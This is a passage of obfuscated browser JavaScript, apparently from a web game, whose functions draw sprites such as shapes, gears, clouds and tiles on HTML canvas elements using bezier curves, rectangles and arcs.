			Δ.bezierCurveTo(105 * ᐃ, ᐃ * 66, 119 * ᐃ, 75 * ᐃ, ᐃ * 123, ᐃ * 96);
			Δ.bezierCurveTo(104 * ᐃ, ᐃ * 91, ᐃ * 101, 94 * ᐃ, 94 * ᐃ, 97 * ᐃ);
			Δ.bezierCurveTo(76 * ᐃ, ᐃ * 92, 73 * ᐃ, 93 * ᐃ, 60 * ᐃ, ᐃ * 99);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[ⲆⲆΔᐃ], 4 * ᐃ);
			ⵠᐃ === 0 ? (Δ.beginPath(), Δ.lineCap = ⵠ[5], Δ.lineJoin = ⵠ[ΔⲆΔΔ], Δ.moveTo(ᐃ * 47, ᐃ * 149), Δ.bezierCurveTo(ᐃ * 43, ᐃ * 140, 48 * ᐃ, ᐃ * 130, ᐃ * 59, ᐃ * 127), Δ.bezierCurveTo(ᐃ * 77, ᐃ * 126, 90 * ᐃ, 131 * ᐃ, ᐃ * 131, ᐃ * 127), Δ.bezierCurveTo(143 * ᐃ, ᐃ * 130, 144 * ᐃ, ᐃ * 143, ᐃ * 132, 154 * ᐃ), Δ.bezierCurveTo(ᐃ * 90, 152 * ᐃ, 90 * ᐃ, 152 * ᐃ, ᐃ * 48, ᐃ * 150), Δ.closePath(), ΔⲆ(Δ, Ⲇᐃ[1]), Δ.beginPath(), Δ.lineCap = ⵠ[5], Δ.lineJoin = ⵠ[5], Δ.moveTo(ᐃ * 40, ᐃ * 139), Δ.bezierCurveTo(48 * ᐃ, 113 * ᐃ, ᐃ * 76, 119 * ᐃ, ᐃ * 91, ᐃ * 126), Δ.bezierCurveTo(117 * ᐃ, ᐃ * 113, 135 * ᐃ, ᐃ * 117, 144 * ᐃ, 134 * ᐃ), Δ.bezierCurveTo(144 * ᐃ, 138 * ᐃ, 144 * ᐃ, 138 * ᐃ, ᐃ * 144, 142 * ᐃ), Δ.bezierCurveTo(ᐃ * 128, 124 * ᐃ, 108 * ᐃ, 124 * ᐃ, 91 * ᐃ, ᐃ * 136), Δ.bezierCurveTo(ᐃ * 59, 124 * ᐃ, 50 * ᐃ, 137 * ᐃ, 42 * ᐃ, ᐃ * 148), Δ.closePath(), ΔⲆ(Δ, Ⲇᐃ[ΔⲆᐃⲆ], Ⲇᐃ[ⲆⲆΔᐃ], ᐃ * 4)) : (Δ.beginPath(), Δ.lineCap = ⵠ[5], Δ.lineJoin = ⵠ[ᐃᐃⲆᐃ], Δ.moveTo(41 * ᐃ, ᐃ * 139), Δ.bezierCurveTo(ᐃ * 53, 117 * ᐃ, 69 * ᐃ, ᐃ * 118, ᐃ * 92, ᐃ * 127), Δ.bezierCurveTo(124 * ᐃ, ᐃ * 111, 136 * ᐃ, ᐃ * 121, ᐃ * 143, ᐃ * 136), Δ.bezierCurveTo(ᐃ * 142, 144 * ᐃ, ᐃ * 142, ᐃ * 144, 141 * ᐃ, ᐃ * 152), Δ.bezierCurveTo(ᐃ * 128, 131 * ᐃ, ᐃ * 113, 138 * ᐃ, ᐃ * 92, ᐃ * 145), Δ.bezierCurveTo(ᐃ * 57, ᐃ * 133, 57 * ᐃ, ᐃ * 147, ᐃ * 44, 154 * ᐃ), Δ.closePath(), ΔⲆ(Δ, Ⲇᐃ[ⲆⲆΔⲆ], Ⲇᐃ[Ⲇⵠⵠᐃ], ᐃ * ΔⲆᐃⵠᐃ));
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ΔΔᐃⲆ];
			Δ.moveTo(ᐃ * 90, 95 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 99, ᐃ * 82, 98 * ᐃ, ᐃ * 58, 99 * ᐃ, 40 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 90, 38 * ᐃ, 89 * ᐃ, ᐃ * 34, ᐃ * 92, 17 * ᐃ);
			Δ.bezierCurveTo(92 * ᐃ, ⵠᐃΔⲆ * ᐃ, 83 * ᐃ, ᐃ * ⵠᐃᐃⵠΔⵠΔ, 78 * ᐃ, ᐃ * 29);
			Δ.bezierCurveTo(72 * ᐃ, ᐃ * 59, ᐃ * 87, ᐃ * 81, ᐃ * 89, ᐃ * 87);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠΔΔ], Ⲇᐃ[2], ΔᐃⵠⵠⲆ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⲆⲆΔⵠ];
			Δ.moveTo(90 * ᐃ, ᐃ * 86);
			Δ.bezierCurveTo(ᐃ * 95, ᐃ * 74, ᐃ * 95, 62 * ᐃ, 95 * ᐃ, ᐃ * 43);
			Δ.bezierCurveTo(ᐃ * 84, 37 * ᐃ, 86 * ᐃ, 34 * ᐃ, ᐃ * 89, ᐃ * ⵠⵠΔΔᐃⵠⲆ);
			Δ.bezierCurveTo(ᐃ * 75, 29 * ᐃ, 80 * ᐃ, ᐃ * 58, ᐃ * 90, 85 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆⵠ], Ⲇᐃ[3], ᐃⵠⵠΔ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔⵠⲆⲆ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 92, 117 * ᐃ);
			Δ.bezierCurveTo(98 * ᐃ, ᐃ * 87, ᐃ * 93, ᐃ * 78, 85 * ᐃ, 76 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 85.5, 79.5 * ᐃ, 85.5 * ᐃ, ᐃ * 79.5, ᐃ * 86, 83 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 84, 85.5 * ᐃ, 84 * ᐃ, 85.5 * ᐃ, ᐃ * 82, 88 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 90, ᐃ * 93, ᐃ * 89, ᐃ * ᐃᐃᐃⵠⵠⲆⵠ, 92 * ᐃ, 117 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃΔᐃⲆ], Ⲇᐃ[ⲆᐃΔᐃ], ᐃ * 4);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃⲆⵠΔ];
			Δ.moveTo(ᐃ * 92, 175 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 95, 135 * ᐃ, ᐃ * 98, ᐃ * 125, 109 * ᐃ, 121 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 106, ᐃ * 114, 104 * ᐃ, ᐃ * 114, ᐃ * 102, ᐃ * 113);
			Δ.bezierCurveTo(ᐃ * 103, 106 * ᐃ, 104 * ᐃ, ᐃ * 103, 107 * ᐃ, 96 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 74, ᐃ * 108, ᐃ * 86, 157 * ᐃ, 92 * ᐃ, ᐃ * 174);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[3], ⵠᐃΔΔ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 48, 169 * ᐃ);
			Δ.bezierCurveTo(42 * ᐃ, ᐃ * 187, 50 * ᐃ, ᐃ * 193, 59 * ᐃ, 198 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, undefined, Ⲇᐃ[Δⵠⵠⵠ], ᐃ * 5);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃΔΔⲆ];
			Δ.lineJoin = ⵠ[ΔⲆΔΔ];
			Δ.moveTo(ᐃ * 136, 171 * ᐃ);
			Δ.bezierCurveTo(139 * ᐃ, ᐃ * 186, 138 * ᐃ, ᐃ * 191, 124 * ᐃ, ᐃ * 199);
			Δ.closePath();
			ΔⲆ(Δ, ⵠΔᐃⲆΔ, Ⲇᐃ[2], ᐃ * ⲆⵠΔⵠ);
			ⵠᐃᐃ(Δ, 63 * ᐃ, ᐃ * 180, 15.231546211727817 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[4]);
			ⵠᐃᐃ(Δ, 121 * ᐃ, ᐃ * 181, 15.652475842498529 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[4]);
			ⵠᐃᐃ(Δ, 58 * ᐃ, 175 * ᐃ, ᐃ * 5.656854249492381);
			ΔⲆ(Δ, Ⲇᐃ[2]);
			ⵠᐃᐃ(Δ, ᐃ * 116, ᐃ * 175, 5.656854249492381 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[ⵠⵠⵠΔ]);
			return Ⲇⵠ
		}

		function ⵠᐃⲆΔⲆⵠᐃ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 248;
			Ⲇⵠ.height = ᐃ * 247;
			Δ.save();
			Δ.translate(ᐃ * 183, ᐃ * 107);
			Ⲇᐃᐃ(Δ, ᐃ * -ⵠⵠⲆⵠΔ, ᐃ * -70.5, ᐃᐃΔⵠⵠⵠΔ * ᐃ, 141 * ᐃ, ⵠΔⲆ * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.save();
			Δ.translate(ᐃ * 69.5, 110 * ᐃ);
			Ⲇᐃᐃ(Δ, ᐃ * -8.5, -71 * ᐃ, 17 * ᐃ, 143 * ᐃ, ᐃ * 1);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[Δⵠᐃ]);
			Δ.save();
			Δ.translate(123.5 * ᐃ, ᐃ * 181);
			Ⲇᐃᐃ(Δ, -84.5 * ᐃ, ᐃ * -26, 169 * ᐃ, 52 * ᐃ, 5 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⲆΔⲆ], Ⲇᐃ[1], ᐃ * 6);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃⲆⵠΔ];
			Δ.moveTo(ᐃ * 41, 95 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 105, 96 * ᐃ, ᐃ * 113, ᐃ * 99, 134 * ᐃ, 102 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 147, ᐃ * 106, ᐃ * 173, ᐃ * ⵠⵠΔᐃᐃ, ᐃ * 207, ᐃ * 105);
			Δ.bezierCurveTo(210 * ᐃ, 105 * ᐃ, 207 * ᐃ, ᐃ * 140, ᐃ * 207, 154 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 123.5, ᐃ * 151.5, 123.5 * ᐃ, 151.5 * ᐃ, 40 * ᐃ, ᐃ * 149);
			Δ.bezierCurveTo(37 * ᐃ, 145 * ᐃ, ᐃ * 39, ᐃ * 95, 41 * ᐃ, ᐃ * 96);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[2], Ⲇᐃ[ᐃᐃⲆΔ], ᐃ * 6);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 68, ᐃ * 75);
			Δ.bezierCurveTo(ᐃ * 54, 72.5 * ᐃ, ᐃ * 54, 72.5 * ᐃ, ᐃ * 40, ᐃ * 70);
			Δ.bezierCurveTo(38 * ᐃ, 46 * ᐃ, 40 * ᐃ, 46 * ᐃ, ᐃ * 53, 46 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 201, 41 * ᐃ, ᐃ * 201, 41 * ᐃ, ᐃ * 201, ᐃ * 42);
			Δ.bezierCurveTo(211 * ᐃ, ᐃ * 40, 208 * ᐃ, ᐃ * 53, 208 * ᐃ, 72 * ᐃ);
			Δ.bezierCurveTo(209 * ᐃ, ᐃ * 91, ᐃ * 210, ᐃ * 96, 194 * ᐃ, 94 * ᐃ);
			Δ.bezierCurveTo(119 * ᐃ, 97 * ᐃ, 119 * ᐃ, 97 * ᐃ, 44 * ᐃ, ᐃⲆΔⲆⵠ * ᐃ);
			Δ.bezierCurveTo(39 * ᐃ, ᐃ * 99, 40 * ᐃ, 96 * ᐃ, ᐃ * 40, 80 * ᐃ);
			Δ.bezierCurveTo(54 * ᐃ, 77.5 * ᐃ, 54 * ᐃ, ᐃ * 77.5, ᐃ * 68, ᐃ * 75);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[1], ⲆᐃⲆΔΔ * ᐃ);
			return Ⲇⵠ
		}

		function ᐃⲆΔⲆᐃⲆⵠ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 191;
			Ⲇⵠ.height = 153 * ᐃ;
			Δ.globalAlpha = .5;
			Δ.translate(ⲆⲆⲆᐃ, ᐃ * 10);
			Δ.save();
			Δ.translate(ᐃ * 96.49996948242188, ᐃ * 66.79510498046875);
			Δ.rotate(ΔΔⵠⵠ);
			Ⲇᐃᐃ(Δ, ᐃ * -79.5, -48.5 * ᐃ, 159 * ᐃ, ᐃ * 97, ᐃ * 22);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⲆᐃⵠ], Ⲇᐃ[0], ⲆⵠᐃⲆ * ᐃ);
			Δ.globalAlpha = ᐃΔᐃⲆ;
			Δ.translate(ⲆΔⵠ, ᐃ * -ⲆⲆⲆΔᐃ);
			Δ.save();
			Δ.translate(ᐃ * 96.49996948242188, ᐃ * 66.79510498046875);
			Δ.rotate(0);
			Ⲇᐃᐃ(Δ, ᐃ * -79.5, -48.5 * ᐃ, 159 * ᐃ, 97 * ᐃ, ᐃ * 22);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[2], ᐃ * ⲆᐃᐃΔ);
			Δ.translate(ᐃ * Ⲇⵠⵠᐃ, ᐃⵠΔ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃΔΔⲆ];
			Δ.lineJoin = ⵠ[ⵠⵠᐃⵠ];
			Δ.moveTo(119 * ᐃ, ᐃ * 28);
			Δ.bezierCurveTo(ᐃ * 119, 22 * ᐃ, ᐃ * 119, ΔΔⲆⵠᐃ * ᐃ, ᐃ * 122, ᐃ * ⵠΔⲆᐃᐃ);
			Δ.bezierCurveTo(ᐃ * 149, 39 * ᐃ, ᐃ * 149, 39 * ᐃ, 176 * ᐃ, 63 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 176, 75 * ᐃ, ᐃ * 176, ᐃ * 75, 175 * ᐃ, ᐃ * 88);
			Δ.bezierCurveTo(ᐃ * 174, ᐃ * 90, ᐃ * 174, 90 * ᐃ, 172 * ᐃ, 93 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 171, ᐃ * 101, ᐃ * 169, 109 * ᐃ, ᐃ * 164, 113 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 163, 104 * ᐃ, 163 * ᐃ, 104 * ᐃ, ᐃ * 162, 95 * ᐃ);
			Δ.bezierCurveTo(155 * ᐃ, 105 * ᐃ, 155 * ᐃ, 105 * ᐃ, ᐃ * 147, ᐃ * 116);
			Δ.bezierCurveTo(87 * ᐃ, ᐃ * 114, 87 * ᐃ, 114 * ᐃ, ᐃ * 26, 112 * ᐃ);
			Δ.bezierCurveTo(27 * ᐃ, ᐃ * 106, 27 * ᐃ, 106 * ᐃ, ᐃ * 27, ᐃ * 101);
			Δ.bezierCurveTo(24 * ᐃ, 104 * ᐃ, 24 * ᐃ, ᐃ * 104, ᐃ * ⵠΔⵠⵠᐃ, 108 * ᐃ);
			Δ.bezierCurveTo(17 * ᐃ, ᐃ * 103, ⵠΔⵠⵠᐃ * ᐃ, ᐃ * 86, ᐃ * 23, 72 * ᐃ);
			Δ.bezierCurveTo(15 * ᐃ, ᐃ * 74, ᐃ * ΔᐃΔⲆⲆⲆⲆ, 78 * ᐃ, ᐃ * 12, 83 * ᐃ);
			Δ.bezierCurveTo(ᐃ * ⵠⲆⵠⲆⵠ, ᐃ * 65, ᐃ * 12, ᐃ * 54, 16 * ᐃ, ᐃ * 42);
			Δ.bezierCurveTo(ⲆⵠⲆⵠΔⵠᐃ * ᐃ, 39 * ᐃ, ᐃ * 14, 39 * ᐃ, ⲆΔⵠᐃⲆ * ᐃ, 36 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 16, ᐃ * 33, ⵠΔⲆᐃᐃ * ᐃ, 33 * ᐃ, ᐃ * ᐃΔⵠᐃⵠᐃⲆ, ᐃ * 30);
			Δ.bezierCurveTo(ᐃ * ᐃᐃᐃᐃⲆ, ᐃ * 27, ᐃ * ⲆⵠⲆᐃΔ, ᐃ * 27, 17 * ᐃ, 25 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 24, ᐃ * 24, ᐃ * 31, 21 * ᐃ, 29 * ᐃ, 19 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 37, ᐃ * 25, ᐃ * 37, ᐃ * 25, ᐃ * 45, 31 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 40, ᐃ * 23, 40 * ᐃ, ᐃ * 21, ᐃ * 42, 16 * ᐃ);
			Δ.bezierCurveTo(74 * ᐃ, 16 * ᐃ, 74 * ᐃ, ᐃ * 16, 106 * ᐃ, 16 * ᐃ);
			Δ.bezierCurveTo(113 * ᐃ, ᐃ * 21, 113 * ᐃ, ᐃ * 21, 119 * ᐃ, ᐃ * 26);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⲆᐃᐃ], Ⲇᐃ[4], ⲆⵠᐃⲆ * ᐃ);
			return Ⲇⵠ
		}
		const ⵠᐃⲆΔ = ⲆΔΔᐃ;
		const ΔᐃⲆⲆⵠ = ⵠⵠⲆΔΔ;

		function ᐃΔⵠⵠᐃᐃᐃ(ᐃ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			var ᐃⵠⵠ = 100 * ᐃ;
			var ⵠⵠᐃ = ᐃ * ᐃⲆΔⲆⵠ;
			var Δⵠ = ᐃⵠⵠ / ᐃⲆΔⲆ;
			var ⲆⵠⲆ = ⵠⵠᐃ / ΔⵠⵠΔ;
			Ⲇⵠ.width = ᐃⵠⵠ;
			Ⲇⵠ.height = ⵠⵠᐃ;
			var ⵠⲆΔΔΔᐃⲆ = ᐃ * ΔΔᐃⲆ;
			var ⵠᐃⵠⲆΔᐃⵠ = ᐃ * 28;
			var ΔⲆⲆᐃΔᐃᐃ = ⵠⲆΔΔΔᐃⲆ / ⵠⵠⵠΔ;
			var ΔᐃΔΔⵠΔΔ = ⵠᐃⵠⲆΔᐃⵠ / 2;
			Δ.translate(Δⵠ, ⲆⵠⲆ);
			for (var ⵠᐃ = 0; ΔΔⵠⵠΔ > ⵠᐃ; ⵠᐃ++) {
				Ⲇᐃᐃ(Δ, -ΔⲆⲆᐃΔᐃᐃ, -ΔᐃΔΔⵠΔΔ, ⵠⲆΔΔΔᐃⲆ, ⵠᐃⵠⲆΔᐃⵠ, ᐃ * 2);
				Δ.rotate(Math.PI / 4);
				ΔⲆ(Δ, Ⲇᐃ)
			}
			Δ.arc(0, 0, ΔⲆⵠⲆⲆ * ᐃ, 0, ΔⵠⵠΔ * Math.PI);
			ΔⲆ(Δ, Ⲇᐃ);
			Δ.globalCompositeOperation = ⵠ[172];
			ⵠᐃᐃ(Δ, 0, ⲆⲆⲆᐃ, 4 * ᐃ);
			Δ.fill();
			return Ⲇⵠ
		}

		function ᐃᐃⲆⲆⲆᐃᐃᐃⲆ(ᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			var ᐃⵠⵠ = 200 * ᐃ;
			var ⵠⵠᐃ = 200 * ᐃ;
			Ⲇⵠ.width = ᐃⵠⵠ;
			Ⲇⵠ.height = ⵠⵠᐃ;
			var ᐃⵠ = ᐃΔⲆⵠⵠ(.35, ᐃⲆᐃⵠΔ, [ⵠ[434], "#0b8052", ⵠ[344]]);
			Δ.drawImage(ᐃⵠ, 10, 10);
			var ᐃⵠ = ⲆⲆⵠⲆᐃ(.9, false, [ⵠ[372], ⵠ[168]]);
			Δ.drawImage(ᐃⵠ, 21, ᐃΔⲆⵠᐃ);
			var ᐃⵠ = ⲆⲆⵠⲆᐃ(.9, ⲆⵠΔⵠΔ, [ⵠ[372], ⵠ[168]]);
			Δ.drawImage(ᐃⵠ, 38, 28);
			var ᐃⵠ = ⲆⲆⵠⲆᐃ(.9, false, [ⵠ[372], ⵠ[168]]);
			Δ.drawImage(ᐃⵠ, ⵠᐃⲆΔᐃᐃⲆ, 37);
			var ᐃⵠ = ⲆⲆⵠⲆᐃ(.9, ᐃⲆᐃⵠΔ, [ⵠ[372], ⵠ[168]]);
			Δ.drawImage(ᐃⵠ, 32, 45);
			return Ⲇⵠ
		}

		function ΔᐃᐃⵠΔⲆⲆ(ᐃ, Ⲇᐃ, ΔᐃⲆ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			var ᐃⵠⵠ = 32 * ᐃ;
			var ⵠⵠᐃ = 32 * ᐃ;
			var Δⵠ = ᐃⵠⵠ / ⲆⵠΔΔ;
			var ⲆⵠⲆ = ⵠⵠᐃ / ⲆΔΔⵠ;
			Ⲇⵠ.width = ᐃⵠⵠ;
			Ⲇⵠ.height = ⵠⵠᐃ;
			var ⵠⲆΔΔΔᐃⲆ = 5 * ᐃ;
			var ⵠᐃⵠⲆΔᐃⵠ = 28 * ᐃ;
			var ΔⲆⲆᐃΔᐃᐃ = ⵠⲆΔΔΔᐃⲆ / 2;
			var ΔᐃΔΔⵠΔΔ = ⵠᐃⵠⲆΔᐃⵠ / 2;
			Δ.translate(0 * ᐃ, ᐃ * 0);
			Δ.translate(Δⵠ, ⲆⵠⲆ);
			if (1 == ΔᐃⲆ) {
				ⵠᐃᐃ(Δ, 0, 0, 10 * ᐃ, Ⲇᐃⵠⵠ);
				ΔⲆ(Δ, Ⲇᐃ[ΔⵠᐃⲆ], Ⲇᐃ[ⲆⲆΔᐃ], 3 * ᐃ);
				for (var ⵠᐃ = 0; ⵠᐃ < 4; ⵠᐃ++) {
					Ⲇᐃᐃ(Δ, -ΔⲆⲆᐃΔᐃᐃ, -ΔᐃΔΔⵠΔΔ, ⵠⲆΔΔΔᐃⲆ, ⵠᐃⵠⲆΔᐃⵠ, ⲆᐃᐃⲆ * ᐃ);
					Δ.rotate(Math.PI / 4);
					ΔⲆ(Δ, Ⲇᐃ[ⲆᐃᐃⲆ], Ⲇᐃ[ΔⲆΔΔΔ], ᐃ * ΔᐃⵠⵠⲆ)
				}
			}
			ⵠᐃᐃ(Δ, 0, 0, ᐃ * ⵠⵠⲆΔΔ, 0);
			ΔⲆ(Δ, Ⲇᐃ[ⲆⲆⲆᐃ], Ⲇᐃ[1], ᐃ * 1.5);
			for (var ⵠᐃ = 0; ⲆⲆⲆΔ > ⵠᐃ; ⵠᐃ++) {
				Ⲇᐃᐃ(Δ, -ΔⲆⲆᐃΔᐃᐃ, -ΔᐃΔΔⵠΔΔ, ⵠⲆΔΔΔᐃⲆ, ⵠᐃⵠⲆΔᐃⵠ, Δᐃⵠⵠ * ᐃ);
				Δ.rotate(Math.PI / ΔⲆᐃⵠᐃ);
				ΔⲆ(Δ, Ⲇᐃ[ᐃΔΔ], Ⲇᐃ[ⲆⵠⲆⲆ], ᐃ * 1.5)
			}
			ⵠᐃᐃ(Δ, ΔᐃΔΔ, 0, 10 * ᐃ, ΔΔⵠⵠ);
			ΔⲆ(Δ, Ⲇᐃ[0]);
			ⵠᐃᐃ(Δ, 0, ⲆⲆⲆᐃ, ᐃ * 4, ΔᐃΔΔ);
			ΔⲆ(Δ, Ⲇᐃ[Δⵠⵠⵠ], Ⲇᐃ[1], ᐃ * 1.5);
			Δ.globalCompositeOperation = ⵠ[172];
			ⵠᐃᐃ(Δ, ⵠⲆⲆ, ⲆⲆⲆᐃ, ᐃ * 4, 0);
			ΔⲆ(Δ, Ⲇᐃ[ΔᐃΔΔ], Ⲇᐃ[1], ᐃ * ᐃⲆⵠᐃ);
			Δ.globalCompositeOperation = ⵠ[512];
			ⵠᐃᐃ(Δ, ⵠⲆⲆ, 0, ᐃ * ΔΔⵠⵠΔ, ⲆⲆⲆᐃ);
			ΔⲆ(Δ, ⵠⵠᐃᐃᐃ, Ⲇᐃ[ⵠΔΔ], ᐃ * ⲆⲆΔᐃ);
			return Ⲇⵠ
		}
		const Ⲇᐃᐃⵠ = ΔⲆΔΔΔ;
		const ᐃᐃᐃᐃⲆᐃᐃ = ΔⲆⵠⵠᐃⲆΔ;

		function ᐃⵠⵠⵠⵠⲆⵠⵠᐃ(ᐃ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 200 * ᐃ;
			Ⲇⵠ.height = 200 * ᐃ;
			Δ.translate(9 * ᐃ, ᐃ * ⲆⲆΔΔⵠΔⲆ);
			Δ.fillStyle = Ⲇᐃ[0];
			Δ.fillRect(-2, -ⲆΔⵠⵠ, Ⲇⵠ.width, Ⲇⵠ.height);
			Δ.fillStyle = Ⲇᐃ[ⲆΔⲆΔⵠ];
			Δ.fillRect(ΔΔⵠⵠ, Ⲇᐃⵠⵠ, Ⲇⵠ.width, Ⲇⵠ.height);
			Δ.fillStyle = Ⲇᐃ[17];
			Δ.fillRect(Δᐃᐃᐃ, 0, Ⲇⵠ.width, Ⲇⵠ.height / 2.1);
			Δ.fillStyle = Ⲇᐃ[26];
			Δ.fillRect(Ⲇⵠ.width / 1.77, Ⲇⵠ.height / 2.1, Ⲇⵠ.width / 2.1, Ⲇⵠ.height / 2.1);
			Δ.fillStyle = Ⲇᐃ[28];
			Δ.fillRect(Ⲇⵠ.width / 1.77, Ⲇⵠ.height / 2.1, ΔΔᐃⲆ, Ⲇⵠ.height / 2.1);
			ⵠΔᐃᐃⲆ(Δ, ᐃ, Ⲇᐃ[17], "so", 3, ⵠⵠⵠⲆⲆ, 0);
			ⵠΔᐃᐃⲆ(Δ, ᐃ, Ⲇᐃ[28], ⵠ[424], ᐃⵠⲆⵠΔ, 2, 2);
			ⵠΔᐃᐃⲆ(Δ, ᐃ, Ⲇᐃ[28], ⵠ[424], 6, ΔΔᐃⵠ, ⵠΔᐃ);
			ⵠΔᐃᐃⲆ(Δ, ᐃ, Ⲇᐃ[28], ⵠ[424], ⵠᐃᐃΔ, ᐃⵠⲆ, Ⲇᐃⵠⵠ);
			ⵠΔᐃᐃⲆ(Δ, ᐃ, Ⲇᐃ[5], ⵠ[138], Δⵠⵠⵠ, Ⲇᐃᐃⵠ, 2);
			ⵠΔᐃᐃⲆ(Δ, ᐃ, Ⲇᐃ[5], ⵠ[138], 2, ᐃᐃⲆΔ, 1);
			ⵠΔᐃᐃⲆ(Δ, ᐃ, Ⲇᐃ[5], ⵠ[138], 2, 0, ᐃⵠⲆ);
			ⵠΔᐃᐃⲆ(Δ, ᐃ, Ⲇᐃ[5], "t", Ⲇᐃᐃⵠ, 5, ⵠⲆⵠᐃ);
			ⵠΔᐃᐃⲆ(Δ, ᐃ, Ⲇᐃ[6], "t", ⲆᐃΔᐃ, ΔⲆΔᐃ, 2);
			ⵠΔᐃᐃⲆ(Δ, ᐃ, Ⲇᐃ[7], "t", 4, 1, 0);
			ⵠΔᐃᐃⲆ(Δ, ᐃ, Ⲇᐃ[8], "b", ΔᐃⲆΔ, 3, 2);
			ⵠΔᐃᐃⲆ(Δ, ᐃ, Ⲇᐃ[9], "b", ΔⲆⲆⲆ, 1, ⲆΔⵠ);
			ⵠΔᐃᐃⲆ(Δ, ᐃ, Ⲇᐃ[2], "s", 2, ⵠⵠⵠΔ, 2);
			ⵠΔᐃᐃⲆ(Δ, ᐃ, Ⲇᐃ[3], "s", ⵠᐃⵠⲆ, ⲆⵠⲆⲆ, ⵠᐃⵠΔ);
			ⵠΔᐃᐃⲆ(Δ, ᐃ, Ⲇᐃ[ⵠⵠΔᐃΔ], "s", ΔⲆⲆⲆ, Δⵠᐃ, 0);
			ⵠΔᐃᐃⲆ(Δ, ᐃ, Ⲇᐃ[10], "g", 2, 2, 2);
			ⵠΔᐃᐃⲆ(Δ, ᐃ, Ⲇᐃ[ⲆⵠΔΔᐃᐃᐃ], "g", 3, ᐃᐃⵠ, 1);
			ⵠΔᐃᐃⲆ(Δ, ᐃ, Ⲇᐃ[12], "g", ᐃⲆᐃⲆⵠ, ⵠⲆᐃⵠ, Ⲇᐃⵠⵠ);
			ⵠΔᐃᐃⲆ(Δ, ᐃ, Ⲇᐃ[1], "p", 4, -ΔⵠΔⵠ);
			ⵠΔᐃᐃⲆ(Δ, ᐃ, Ⲇᐃ[25], "dg", 3, ⵠΔⵠᐃⵠ, 0);
			ⵠΔᐃᐃⲆ(Δ, ᐃ, Ⲇᐃ[27], ⵠ[568], 2, Δᐃⵠⵠ, ᐃⲆΔⲆ);
			ⵠΔᐃᐃⲆ(Δ, ᐃ, Ⲇᐃ[27], ⵠ[568], ⵠⵠΔⲆ, 1, ᐃᐃⲆΔ);
			ⵠΔᐃᐃⲆ(Δ, ᐃ, Ⲇᐃ[27], ⵠ[568], 2, 0, 0);
